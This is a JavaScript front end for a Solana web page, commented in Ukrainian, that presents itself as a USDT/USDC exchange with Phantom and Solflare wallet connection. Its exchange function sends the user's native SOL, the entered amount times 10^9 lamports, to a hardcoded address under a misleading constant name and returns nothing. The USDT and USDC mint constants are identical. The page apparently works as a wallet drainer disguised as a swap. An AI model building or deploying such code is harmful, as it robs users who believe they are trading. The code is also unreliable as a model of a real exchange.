const { Connection, PublicKey, SystemProgram, Transaction, Keypair } = solanaWeb3;
const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");


// Адреси токенів
const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");

// UI елементи
const connectWalletBtn = document.getElementById("connectWalletBtn");
const walletStatus = document.getElementById("walletStatus");
const exchangeBtn = document.getElementById("exchangeBtn");
const amountInput = document.getElementById("amount");
const tokenSelect = document.getElementById("tokenSelect");
const walletPopup = document.getElementById("walletPopup");

// Функція для визначення мобільного пристрою
function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

// Визначення доступного гаманця
const getWallet = (walletType) => {
    if (walletType === "phantom" && window.phantom?.solana?.isPhantom) {
        return window.phantom.solana;
    } else if (walletType === "solflare" && window.solflare?.isSolflare) {
        return window.solflare;
    }
    return null;
};

// Відкриття/закриття попапу
connectWalletBtn.addEventListener("click", () => {
    walletPopup.classList.add("show-popup");
});

function closePopup() {
    walletPopup.classList.remove("show-popup");
}

// Підключення гаманця (з підтримкою диплінків для мобільних пристроїв)
function connectWallet(walletType) {
    closePopup();

    if (isMobile()) {
        const dappUrl = encodeURIComponent(window.location.origin);
        let deepLink = "";

        if (walletType === "phantom") {
            deepLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${dappUrl}`;
        } else if (walletType === "solflare") {
            deepLink = `https://solflare.com/connect-wallet?ref=${dappUrl}`;
        }

        if (deepLink) {
            window.location.href = deepLink;
        } else {
            alert("Wallet type not supported.");
        }
        return;
    }

    let wallet = getWallet(walletType);
    if (!wallet) {
        alert(`Будь ласка, встановіть ${walletType === "phantom" ? "Phantom Wallet" : "Solflare"}`);
        return;
    }

    wallet.connect()
        .then(() => {
            walletStatus.textContent = `Гаманець підключено: ${wallet.publicKey.toString()}`;
        })
        .catch(err => {
            console.error("Помилка підключення:", err);
        });
}

// Перевірка балансу
async function getTokenBalance(ownerAddress, mintAddress) {
    try {
        const response = await connection.getParsedTokenAccountsByOwner(ownerAddress, { mint: mintAddress });
        if (response.value.length > 0) {
            return parseFloat(response.value[0].account.data.parsed.info.tokenAmount.uiAmount);
        }
        return 0;
    } catch (error) {
        console.error("Помилка отримання балансу:", error);
        return 0;
    }
}

// Обмін токенів
exchangeBtn.addEventListener("click", async () => {
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0) {
        alert("Будь ласка, введіть коректну кількість USDT/USDC");
        return;
    }

    let wallet = getWallet("phantom");
    if (!wallet || !wallet.publicKey) {
        alert("Будь ласка, підключіть гаманець");
        return;
    }

    const mintAddress = tokenSelect.value === "USDT" ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;
    const balance = await getTokenBalance(wallet.publicKey, mintAddress);

    if (balance < amount) {
        alert("Недостатньо коштів для обміну!");
        return;
    }

    await exchangeTokens(wallet, amount);
});

// Відправка транзакції
async function exchangeTokens(wallet, amountInUSDT) {
    try {
        const transaction = new Transaction();
        const sender = wallet.publicKey;

        const transferInstruction = SystemProgram.transfer({
            fromPubkey: sender,
            toPubkey: SPL_TOKEN_ADDRESS,
            lamports: amountInUSDT * 1000000000 // Конвертація
        });

        transaction.add(transferInstruction);

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = sender;

        const signedTransaction = await wallet.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false, preflightCommitment: "confirmed" });

        await connection.confirmTransaction(txid);
        console.log(`Транзакція успішно надіслана! TXID: ${txid}`);
    } catch (err) {
        console.error("Помилка обміну:", err);
    }
}

// Підпис повідомлення (для підтвердження власності гаманця)
async function signMessage() {
    let wallet = getWallet("phantom");
    if (!wallet || !wallet.publicKey) {
        alert("Будь ласка, підключіть гаманець");
        return;
    }

    try {
        const message = new TextEncoder().encode("Підтвердження власності гаманця");
        const signedMessage = await wallet.signMessage(message);
        console.log("Підписане повідомлення:", signedMessage);
    } catch (error) {
        console.error("Помилка підпису повідомлення:", error);
    }
}
